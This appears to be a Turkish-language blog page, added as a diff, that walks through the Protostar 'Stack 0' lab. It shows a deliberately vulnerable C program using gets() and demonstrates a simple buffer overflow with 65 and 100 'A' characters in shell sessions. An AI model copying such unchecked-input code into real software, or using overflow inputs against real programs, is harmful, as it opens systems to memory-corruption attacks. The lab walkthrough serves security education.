@@ -1,0 +1,54 @@
+<!doctype html><html lang=tr-tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/style.css><link rel=icon type=image/png href=/favicon.png><meta http-equiv=cache-control content=public><meta name=description content="Burada bir şey yok"><title>Stack 0 | Emir (0xF61)</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-135684308-2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-135684308-2');</script></head><body><nav><ul class=menu>|<li><a href=/>Ana Sayfa</a></li>|<li><a href=/yaz%C4%B1lar/>Yazılar</a></li>|<li><a href=/etiketler/>Etiketler</a></li>|<li><a href=/linkler/>Linkler</a></li>|<li><a href=/ara/>Ara</a></li>|</ul><hr></nav><div class=article-meta></div><span class=rtime>📖 3 dakika</span>
+<a href=..>↪ Protostar</a><h1 class=baslik>Stack 0</h1><main><h2 id=stack0-c>Stack0.c</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
+{
+    <span style=color:#66d9ef>volatile</span> <span style=color:#66d9ef>int</span> modified;
+    <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>64</span>];
+
+    modified <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    gets(buffer);
+
+    <span style=color:#66d9ef>if</span>(modified <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
+        printf(<span style=color:#e6db74>&#34;you have changed the &#39;modified&#39; variable</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+    } <span style=color:#66d9ef>else</span> {
+        printf(<span style=color:#e6db74>&#34;Try again?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+    }
+}</code></pre></div><p><strong>Amaç:</strong> &ldquo;you have changed the &lsquo;modified&rsquo; variable&rdquo; satırını yazdırmak.</p><p>İstediğimiz cümleyi yazdırabilmemiz için programın akışını değiştirilebilmemiz
+gerekiyor. Bunun için bir yukarıdaki if koşulunun sağlanması gerekmekte, bunun
+içinde <em>modified</em> değişkeninin yukarıda tanımlanan 0 değerinden başka bir değere
+sahip olması gerekmekte.</p><h2 id=programın-çalıştırılması>Programın çalıştırılması</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack0
+Merhaba
+Try again?</code></pre></div><p>Programmı çalıştırdığım zaman <em>gets()</em> fonksiyonuyla kullanıcıdan stdin&rsquo;den
+değer aldığını daha sonra <em>modified</em> değişkeni hala 0 olduğu için &ldquo;Try again?&rdquo;
+mesajını yazdırdığını görüyoruz.</p><h2 id=gets-fonsiyonundaki-sorun>gets() Fonsiyonundaki Sorun</h2><p>Burada <em>gets()</em> fonksiyonuna dikkat etmek gerekiyor. Eğer man sayfalarını
+kontrol edecek olursak.</p><p><em>Never use gets(). Because it is impossible to tell without knowing the data in</em>
+<em>advance how many characters gets() will read, and because gets() will</em>
+<em>continue to store characters past the end of the buffer, it is extremely</em>
+<em>dangerous to use. It has been used to break computer security.</em></p><p>Yani gets() fonksiyonu stack frame&rsquo;e istediğimiz gibi doldurabilmemize olanak
+sağlıyor. Burada stack frame ile kast edilen şey programdaki fonksiyonları lokal
+değişkenleri stack içerisinde atılır ve her fonksiyonun kendine ait bir stack
+frame&rsquo;i bulunur. Böylece program içerisindeki fonksiyonlar birbirlerinin
+değişkenlerine erişemezler. -Global değişkenler bundan farklı olarak adresleri
+ile çağırılırlar ve bu değişkenler stack veya heap dışında <em>Data Section</em>
+tutulur.</p><h2 id=çalıştırılabilir-dosyanın-bölümleri>Çalıştırılabilir dosyanın bölümleri</h2><ul><li>Code (Text)</li><li>Data</li><li>Stack</li><li>Heap</li></ul><p><strong>Code (Text):</strong> Basitçe makina kodlarının bulunduğu bölüm.</p><p><strong>Data:</strong> Global ve statik değişken adreslerinin bulunduğu bölüm.</p><p><strong>Stack:</strong> Lokal değişkenlerin bulunduğu bölüm. Belleğin sonundan <em>Data</em> kısmına
+doğru büyür. -Stack pointerin adresi küçülür-</p><p><strong>Heap:</strong> Dinamik değişkenlerin bulunduğu bölüm. Data bölümünden belleğin alt
+kısımlarına doğru büyür.</p><h2 id=modified-değişkenini-değiştirilmesi>Modified Değişkenini Değiştirilmesi</h2><p>Yukarıdaki bilgiler doğrultusunda gets() fonksiyonunu kullanarak aynı stack
+frame&rsquo;de bulunan modified değişkenini değiştirebiliriz. Bunu yapmak aslında
+çok kolay. Programa input verirken <em>buffer[64]</em>&lsquo;ı doldurduktan sonra yazmaya
+devam etmemiz yeterli.</p><hr><p>İstediğim kadar harf üretebilmek için python&rsquo;dan yardım alıyorum</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ python -c <span style=color:#e6db74>&#34;print(&#39;A&#39;*64)&#34;</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre></div><hr><p>64 tane A verdiğimiz zaman ilk seferde çalıştırdığımdaki çıktıyı görüyorum bu
+zaten buffer dolduğu fakat modified değişkeni değişmediği için beklenilen sonuç.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack0 <span style=color:#75715e>#64 Tane A</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Try again?</code></pre></div><hr><p>Buffer dolduktan hemen sonra modified (int) değişkeni(4 byte) olduğu için sadece
+tek bir byte&rsquo;ını değiştirmem yetti.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack0 <span style=color:#75715e>#65 Tane A</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+you have changed the <span style=color:#e6db74>&#39;modified&#39;</span> variable</code></pre></div><hr><p>Eğer buffer ve 4byte&rsquo;lık modified değişkenini değiştirdikten sonra yazmaya devam
+edersek &ldquo;Segmentation fault&rdquo; denilen hata ile karşılaşırız. <em>Segmentation Fault</em>
+programın kendi hafıza alanının dışındaki bir adrese erişmeye çalıştığı zaman
+işletim sistemi tarafından döndürülen bir hatadır.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack0 <span style=color:#75715e>#100 Tane A</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+you have changed the <span style=color:#e6db74>&#39;modified&#39;</span> variable
+Segmentation fault</code></pre></div></main><footer><hr><a href=/index.xml>Feed</a></footer></body></html>
